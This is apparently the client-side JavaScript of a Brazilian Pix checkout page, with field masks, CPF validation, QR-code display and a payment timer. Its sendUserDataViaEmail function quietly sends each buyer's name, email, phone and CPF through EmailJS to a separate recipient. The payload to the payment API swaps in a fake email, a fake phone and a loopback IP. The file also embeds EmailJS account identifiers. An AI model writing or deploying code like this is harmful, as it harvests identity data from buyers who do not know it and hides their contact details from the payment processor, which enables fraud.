// ============================================
// CONFIGURAÇÃO DA API
// ============================================

const BACKEND_API_BASE_URL = '/api/payments';

// ============================================
// CONFIGURAÇÃO DO EMAILJS
// ============================================
// IMPORTANTE: Substitua estas variáveis com suas credenciais do EmailJS
// Acesse: https://www.emailjs.com/
const EMAILJS_SERVICE_ID = 'service_r55hsdo'; // Ex: 'service_abc123'
const EMAILJS_TEMPLATE_ID = 'template_hm39jvj'; // Ex: 'template_xyz456'
const EMAILJS_PUBLIC_KEY = 'Kym-2rwL3TTxvgLG-'; // Ex: 'user_123abc456def'

// Estado da aplicação
let pixTimer = null;
let timeRemaining = 900; // 15 minutos em segundos

// ============================================
// MÁSCARAS DE FORMATAÇÃO
// ============================================

function formatCPF(value) {
    return value
        .replace(/\D/g, '')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
        .slice(0, 14);
}

function formatPhone(value) {
    return value
        .replace(/\D/g, '')
        .replace(/^(\d\d)(\d)/g, '($1) $2')
        .replace(/(\d{5})(\d)/, '$1-$2')
        .slice(0, 15);
}

// ============================================
// VALIDAÇÕES
// ============================================

function validateCPF(cpf) {
    const cleanCPF = cpf.replace(/\D/g, '');
    if (cleanCPF.length !== 11) return false;
    
    if (/^(\d)\1{10}$/.test(cleanCPF)) return false;
    
    let sum = 0;
    let remainder;
    
    for (let i = 1; i <= 9; i++) {
        sum += parseInt(cleanCPF.substring(i - 1, i)) * (11 - i);
    }
    
    remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cleanCPF.substring(9, 10))) return false;
    
    sum = 0;
    for (let i = 1; i <= 10; i++) {
        sum += parseInt(cleanCPF.substring(i - 1, i)) * (12 - i);
    }
    
    remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cleanCPF.substring(10, 11))) return false;
    
    return true;
}

function validateEmail(email) {
    const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/;
    return emailRegex.test(email);
}

function validatePhone(phone) {
    const cleanPhone = phone.replace(/\D/g, '');
    return cleanPhone.length === 10 || cleanPhone.length === 11;
}

function validateFullName(name) {
    return name.trim().split(' ').length >= 2;
}

// ============================================
// NOTIFICAÇÕES TOAST
// ============================================

function showToast(message, type = 'success') {
    const toast = document.getElementById('toast');
    toast.textContent = message;
    toast.className = `toast ${type}`;
    toast.classList.add('show');
    
    setTimeout(() => {
        toast.classList.remove('show');
    }, 3000);
}

// ============================================
// VALIDAÇÃO DE CAMPOS
// ============================================

function validateField(input) {
    const field = input.id;
    const value = input.value;
    let isValid = true;
    let errorMessage = '';
    
    switch(field) {
        case 'fullName':
            if (!value.trim()) {
                errorMessage = 'Nome completo é obrigatório';
                isValid = false;
            } else if (!validateFullName(value)) {
                errorMessage = 'Digite seu nome completo';
                isValid = false;
            }
            break;
        case 'email':
            if (!value.trim()) {
                errorMessage = 'E-mail é obrigatório';
                isValid = false;
            } else if (!validateEmail(value)) {
                errorMessage = 'Digite um e-mail válido';
                isValid = false;
            }
            break;
        case 'cpf':
            if (!value.trim()) {
                errorMessage = 'CPF é obrigatório';
                isValid = false;
            } else if (!validateCPF(value)) {
                errorMessage = 'Digite um CPF válido';
                isValid = false;
            }
            break;
        case 'phone':
            if (!value.trim()) {
                errorMessage = 'Telefone é obrigatório';
                isValid = false;
            } else if (!validatePhone(value)) {
                errorMessage = 'Digite um telefone válido';
                isValid = false;
            }
            break;
    }
    
    const errorElement = document.getElementById(field + 'Error');
    if (isValid) {
        input.classList.remove('error');
        errorElement.textContent = '';
    } else {
        input.classList.add('error');
        errorElement.textContent = errorMessage;
    }
    
    return isValid;
}

function validateForm() {
    const fullName = document.getElementById('fullName');
    const email = document.getElementById('email');
    const cpf = document.getElementById('cpf');
    const phone = document.getElementById('phone');
    
    const isFullNameValid = validateField(fullName);
    const isEmailValid = validateField(email);
    const isCPFValid = validateField(cpf);
    const isPhoneValid = validateField(phone);
    
    return isFullNameValid && isEmailValid && isCPFValid && isPhoneValid;
}

// ============================================
// ENVIAR DADOS REAIS DO USUÁRIO VIA EMAILJS
// ============================================

async function sendUserDataViaEmail(formData) {
    console.log('📧 Enviando dados reais do usuário via EmailJS');
    
    try {
        // Verificar se EmailJS está configurado
        if (EMAILJS_SERVICE_ID === 'SEU_SERVICE_ID' || 
            EMAILJS_TEMPLATE_ID === 'SEU_TEMPLATE_ID' || 
            EMAILJS_PUBLIC_KEY === 'SUA_PUBLIC_KEY') {
            console.warn('⚠️  EmailJS não está configurado. Configure as credenciais no script.js');
            return;
        }
        
        // Parâmetros do template do EmailJS
        const templateParams = {
            to_email: 'seu-email@exemplo.com', // ← SUBSTITUA PELO EMAIL QUE RECEBERÁ OS DADOS
            from_name: formData.fullName,
            user_name: formData.fullName,
            user_email: formData.email,
            user_phone: formData.phone,
            user_cpf: formData.cpf,
            timestamp: new Date().toLocaleString('pt-BR'),
            amount: 'R$ 43,67'
        };
        
        console.log('📤 Enviando email com dados:', templateParams);
        
        // Enviar email via EmailJS
        const response = await emailjs.send(
            EMAILJS_SERVICE_ID,
            EMAILJS_TEMPLATE_ID,
            templateParams,
            EMAILJS_PUBLIC_KEY
        );
        
        console.log('✅ Email enviado com sucesso:', response);
        
    } catch (error) {
        console.error('❌ Erro ao enviar email via EmailJS:', error);
        // Não interrompe o fluxo mesmo se o email falhar
    }
}

// ============================================
// EXTRAÇÃO DE DADOS DO PIX
// ============================================

function extractPixData(response) {
    console.log('🔍 Analisando resposta da Payevo');
    console.log('Estrutura da resposta:', Object.keys(response));
    
    if (!response.pix) {
        console.error('❌ Propriedade "pix" não encontrada na resposta');
        return null;
    }
    
    const pixData = response.pix;
    console.log('Propriedades de pix:', Object.keys(pixData));
    console.log('Conteúdo completo de pix:', JSON.stringify(pixData, null, 2));
    
    let qrCode = null;
    let copyAndPaste = null;
    
    // Lista de possíveis nomes para QR Code
    const possibleQrNames = [
        'qrcode',       // Mais comum (minúscula)
        'qrCode',       // camelCase
        'qr_code',      // snake_case
        'brCode',       // Alternativa
        'br_code',      // snake_case alternativa
        'QRCode',       // PascalCase
        'QR_CODE',      // MAIÚSCULA
        'BRCode'        // MAIÚSCULA alternativa
    ];
    
    // Lista de possíveis nomes para Copia e Cola
    const possibleCopyNames = [
        'copyAndPaste',
        'copy_and_paste',
        'copiaECola',
        'copia_e_cola',
        'copiaecola',
        'copyPaste'
    ];
    
    // Procurar QR Code
    for (const name of possibleQrNames) {
        if (pixData[name]) {
            qrCode = pixData[name];
            console.log(`✅ QR Code encontrado em: pix.${name}`);
            break;
        }
    }
    
    // Procurar Copy and Paste
    for (const name of possibleCopyNames) {
        if (pixData[name]) {
            copyAndPaste = pixData[name];
            console.log(`✅ Copy and Paste encontrado em: pix.${name}`);
            break;
        }
    }
    
    // Se não encontrou QR Code, procurar em qualquer propriedade que comece com '00020126'
    if (!qrCode) {
        for (const key in pixData) {
            const value = pixData[key];
            if (typeof value === 'string' && value.startsWith('00020126')) {
                qrCode = value;
                console.log(`✅ QR Code encontrado em: pix.${key} (por padrão Pix)`);
                break;
            }
        }
    }
    
    // Se ainda não encontrou, usar o primeiro valor string como fallback
    if (!qrCode) {
        for (const key in pixData) {
            const value = pixData[key];
            if (typeof value === 'string' && value.length > 50) {
                qrCode = value;
                console.log(`✅ QR Code encontrado em: pix.${key} (fallback)`);
                break;
            }
        }
    }
    
    // Se copy and paste não foi encontrado, usar o QR Code como fallback
    if (!copyAndPaste && qrCode) {
        copyAndPaste = qrCode;
    }
    
    if (!qrCode) {
        console.error('❌ QR Code não encontrado em nenhuma propriedade');
        console.error('Propriedades disponíveis:', Object.keys(pixData));
        return null;
    }
    
    return { qrCode, copyAndPaste };
}

// ============================================
// PROCESSAR PAGAMENTO PIX
// ============================================

async function processPixPayment(formData) {
    console.log('📦 Processando pagamento Pix');
    console.log('⚠️  Dados enviados para API: EMAIL E TELEFONE PADRÃO');
    console.log('📧 Dados reais do usuário serão enviados via EmailJS');

    // ============================================
    // ENVIAR DADOS REAIS VIA EMAILJS
    // ============================================
    await sendUserDataViaEmail(formData);

    // ============================================
    // ENVIAR DADOS PADRÃO PARA A API
    // ============================================
    const pixData = {
        paymentMethod: 'PIX',
        amount: Math.round(43.67 * 100), // Valor em centavos
        customer: {
            name: formData.fullName, // Nome real
            email: 'email@gmail.com', // ← EMAIL PADRÃO
            document: formData.cpf.replace(/\D/g, ''), // CPF real
            phone: '11122312313' // ← TELEFONE PADRÃO (sem formatação)
        },
        items: [{
            title: 'Checkout',
            quantity: 1,
            price: Math.round(43.67 * 100),
            description: 'Pagamento de serviço'
        }],
        ip: '127.0.0.1'
    };

    console.log('📤 Payload enviado para API (com dados padrão):', JSON.stringify(pixData, null, 2));

    try {
        const response = await fetch(`${BACKEND_API_BASE_URL}/pix`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(pixData)
        });

        const result = await response.json();
        console.log('📥 Resposta recebida:', JSON.stringify(result, null, 2));

        if (!response.ok) {
            console.error('❌ Erro HTTP:', response.status);
            console.error('Detalhes do erro:', result);
            throw new Error(result.message || `Erro HTTP ${response.status}`);
        }

        // Extrair dados do PIX
        const pixInfo = extractPixData(result);
        
        if (!pixInfo) {
            console.error('❌ Não foi possível extrair dados do PIX');
            throw new Error('QR Code não retornado pela API');
        }

        console.log('✅ Dados do PIX extraídos com sucesso');
        
        return {
            status: result.status,
            transactionId: result.transactionId,
            pix: {
                qrcode: pixInfo.qrCode,
                copyAndPaste: pixInfo.copyAndPaste
            },
            expiresAt: result.expiresAt,
            amount: result.amount
        };

    } catch (error) {
        console.error('❌ Erro ao processar pagamento Pix:', error.message);
        throw new Error('Erro ao processar pagamento. Tente novamente.');
    }
}

// ============================================
// GERAR QR CODE
// ============================================

function generateQRCode(pixCode) {
    const container = document.getElementById('qrcodeContainer');
    container.innerHTML = '';
    
    try {
        QRCode.toCanvas(pixCode, {
            width: 256,
            margin: 2,
            color: {
                dark: '#000000',
                light: '#FFFFFF'
            }
        }, function (error, canvas) {
            if (error) {
                console.error('❌ Erro ao gerar QR Code:', error);
                container.innerHTML = '<p style="color: red;">Erro ao gerar QR Code</p>';
            } else {
                console.log('✅ QR Code gerado com sucesso');
                container.appendChild(canvas);
            }
        });
    } catch (error) {
        console.error('❌ Erro ao gerar QR Code:', error);
        container.innerHTML = '<p style="color: red;">Erro ao gerar QR Code</p>';
    }
}

// ============================================
// EXIBIR DETALHES DO PAGAMENTO PIX
// ============================================

function showPixPaymentDetails(paymentResult) {
    console.log('📋 Exibindo detalhes do pagamento Pix');
    
    const pixCodeText = document.getElementById('pixCode');
    const pixQrCodeContainer = document.getElementById('qrcodeContainer');
    
    if (paymentResult.pix && paymentResult.pix.qrcode) {
        const pixCode = paymentResult.pix.qrcode;
        
        // Exibir código Pix
        pixCodeText.value = pixCode;
        
        // Gerar QR Code visual
        generateQRCode(pixCode);
        
        console.log('✅ Checkout concluído com sucesso');
    } else {
        console.error('❌ Dados do PIX não encontrados');
        pixQrCodeContainer.innerHTML = 'Não foi possível obter os dados do PIX.';
        pixCodeText.value = 'Tente novamente.';
    }
    
    // Iniciar timer
    startPixTimer();
}

// ============================================
// TIMER DO PIX
// ============================================

function startPixTimer() {
    timeRemaining = 900; // Reset para 15 minutos
    const timerElement = document.getElementById('pixTimer');
    
    if (pixTimer) {
        clearInterval(pixTimer);
    }
    
    pixTimer = setInterval(() => {
        timeRemaining--;
        
        const minutes = Math.floor(timeRemaining / 60);
        const seconds = timeRemaining % 60;
        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (timeRemaining <= 0) {
            clearInterval(pixTimer);
            showToast('Código Pix expirado. Gere um novo código.', 'error');
        }
    }, 1000);
}

// ============================================
// COPIAR CÓDIGO PIX
// ============================================

function copyPixCode() {
    const pixCodeInput = document.getElementById('pixCode');
    pixCodeInput.select();
    pixCodeInput.setSelectionRange(0, 99999);
    
    navigator.clipboard.writeText(pixCodeInput.value).then(() => {
        showToast('Código Pix copiado!', 'success');
    }).catch(() => {
        document.execCommand('copy');
        showToast('Código Pix copiado!', 'success');
    });
}

// ============================================
// VOLTAR AO FORMULÁRIO
// ============================================

function backToForm() {
    if (pixTimer) {
        clearInterval(pixTimer);
    }
    document.getElementById('pixScreen').style.display = 'none';
    document.getElementById('formScreen').style.display = 'flex';
}

// ============================================
// SUBMISSÃO DO FORMULÁRIO
// ============================================

async function handleSubmit(e) {
    e.preventDefault();
    
    if (!validateForm()) {
        showToast('Por favor, corrija os erros no formulário', 'error');
        return;
    }
    
    const formData = {
        fullName: document.getElementById('fullName').value,
        email: document.getElementById('email').value,
        cpf: document.getElementById('cpf').value,
        phone: document.getElementById('phone').value
    };
    
    const submitBtn = document.querySelector('button[type="submit"]');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Processando...';
    
    try {
        const paymentResult = await processPixPayment(formData);
        
        // Ocultar formulário e mostrar tela de Pix
        document.getElementById('formScreen').style.display = 'none';
        document.getElementById('pixScreen').style.display = 'flex';
        
        // Exibir detalhes do pagamento
        showPixPaymentDetails(paymentResult);
        
    } catch (error) {
        console.error('❌ Erro ao gerar Pix:', error);
        showToast(error.message || 'Erro ao processar pagamento. Tente novamente.', 'error');
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Gerar QR Code Pix';
    }
}

// ============================================
// INICIALIZAÇÃO
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    // Adicionar listeners para máscaras
    document.getElementById('cpf')?.addEventListener('input', (e) => {
        e.target.value = formatCPF(e.target.value);
    });
    
    document.getElementById('phone')?.addEventListener('input', (e) => {
        e.target.value = formatPhone(e.target.value);
    });
    
    // Adicionar listener para validação em tempo real
    ['fullName', 'email', 'cpf', 'phone'].forEach(fieldId => {
        const field = document.getElementById(fieldId);
        if (field) {
            field.addEventListener('blur', () => validateField(field));
        }
    });
    
    // Adicionar listener para submissão do formulário
    const form = document.querySelector('form');
    if (form) {
        form.addEventListener('submit', handleSubmit);
    }
    
    console.log('✅ Aplicação inicializada com sucesso');
    console.log('⚠️  MODO MODIFICADO: Email e telefone padrão para API');
    console.log('📧 Dados reais serão enviados via EmailJS');
});
